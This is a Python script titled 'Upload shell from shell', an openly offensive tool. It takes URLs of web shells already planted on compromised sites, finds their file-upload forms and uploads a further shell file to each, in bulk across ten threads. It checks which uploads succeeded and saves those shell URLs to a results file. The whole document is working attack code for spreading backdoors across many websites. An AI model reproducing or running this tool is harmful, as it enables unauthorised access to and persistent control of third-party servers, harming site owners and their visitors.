import requests as req, os, re, random, sys
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as work

#// main data
header = {"user-agent": "chrome"}
save = "crifty_shell.txt"
clear = lambda: os.system("clear") if "cmd" in sys.platform.lower() else os.system("clear")
suc, fail = 0, 0
working = "\x1b[1;92muploaded ->\x1b[1;97m "
nowork = "\x1b[1;91muploaded ->\x1b[1;97m "
#---------------

def startMenu():
	print("""

     ///[ Upload shell from shell ]\\\\\\
     ---------------------------------
	1. Single upload
	2. Multi uploaf
	3. exit program
     ---------------------------------
	""")
	pil = input("[?] Choose: ")
	while pil == "" or not pil.isdigit():
		pil = input("[?] Choose: ")
	if pil == "1":
		single()
	elif pil == "2":
		multi()
	else:
		exit("[!] Exit program.. byee\n")

def runCoder(keys, shell):
	global header, suc, fail
	reg = re.search("(https?://.*?/.*?\.\w+)", keys)
	if reg is None:
		print(nowork+keys)
		fail += 1
	else:
		ses = req.Session()
		okinawa = par(ses.get(keys, headers=header).text, "html.parser")
		forms = okinawa.find("form", {"enctype": "multipart/form-data"})
		data = {}
		for inp in forms.find_all("input"):
			if inp.get("type") == "file":
				pass
			else:
				data.update({inp.get("name"): inp.get("value")})
		sourceFile = forms.find("input", {"type": "file"}).get("name")
		source     = {sourceFile: (shell.split("/")[-1], open(shell,"rb"), "multipart/form-data")}
		getAction  = forms.get("action")
		if getAction is None:
			posted = keys
		else:
			if getAction == "":
				posted = keys
			elif getAction.startswith("http") or getAction.startswith("https"):
				posted = getAction
			else:
				posted = req.group(1) + getAction

		#-> posted
		if len(data) == 0:
			posts = ses.post(posted, files=source, headers=header).text
		else:
			posts = ses.post(posted, data=data, files=source, headers=header).text
		cek = req.get(keys, headers=header).text
		result = re.search("https?://.*?/(.*?\.\w+)", reg.group(1)).group(1)
		result_2 = reg.group(1)
		result_3 = result_2.replace(result, shell)
		if shell.split("/")[-1] in str(cek):
			print(working+result_3)
			open(save, "a+").write(result_3+"\n")
			suc += 1
		else:
			print(nowork+reg.group(1))
			fail += 1


def run_chek(urls, name):
	regex = lambda code: re.search("(https?://.*?/.*?\.\w+)", code).group(1) if re.search("(https?://.*?/.*?\.\w+)", code) is not None else None
	if regex(urls) is None:
		print(nowork+str(urls))
	else:
		urls = regex(urls)
		cek = req.get(urls, headers=header)
		if cek.status_code != 200:
			print(nowork+str(urls))
		else:
			varParser = ""
			parser = par(cek.text, "html.parser")
			for form in parser.find_all("form", {"enctype": "multipart/form-data"}):
				varParser = str(form).lower()
			if len(varParser) == 0:
				result = ""
				for hrf in parser.find_all("a"):
					if str(hrf.text).lower().replace(" ","") in ["upload", "upload file", "file upload", "unggah file", "unggah"]:
						result += str(urls + hrf.get("href"))
					else:
						pass
				if len(result) == 0:
					print(nowork+str(urls))
				else:
					runCoder(result.split("\n")[0], name)
			else:
				runCoder(urls, name)

def single():
	global suc, fail
	urls = input("[=] Input url shell: ")
	chek = re.search("(https?://.*?/.*?\.\w+)", urls)
	if chek is None:
		exit("[!] Url invalid, Shell must be php extension\n")
	else:
		nameshell = input("[=] Input file shell: ")
		try:
			open(nameshell, "r").read()
		except FileNotFoundError:
			exit("[!] File not available\n")
		print("[!] Please wait..\n")
		run_chek(urls, nameshell)
		if int(suc) != 0:
			print("\n[✓] result save as: "+save)
			exit("[✓] Success. result = [\x1b[1;92m%s\x1b[1;00m/\x1b[1;91m%s\x1b[1;00m]\n\n" % (int(suc), int(fail)))
		else:
			exit("\n[✓] Process done, no result found :(\n\n")


def multi():
	global suc, fail
	inpurl = input("[=] Input list file shell: ")
	try:
		cek = open(inpurl, "r").read().strip().split("\n")
	except FileNotFoundError:
		exit("[?] File does not exist\n")

	inpushell = input("[=] Input file shell: ")
	try:
		cok = open(inpushell, "r").read()
	except FileNotFoundError:
		exit("[?] File does not exist\n")

	print("[!] Please wait..\n")
	with work(max_workers=10) as sub:
		for cy in cek:
			sub.submit(run_chek, cy, inpushell)
	if int(suc) != 0:
		print("\n[✓] result save as: "+save)
		exit("[✓] Success. result = [\x1b[1;92m%s\x1b[1;00m/\x1b[1;91m%s\x1b[1;00m]\n\n" % (int(suc), int(fail)))
	else:
		exit("\n[✓] Process done, no result found :(\n\n")


if __name__=="__main__":
	clear()
	startMenu()
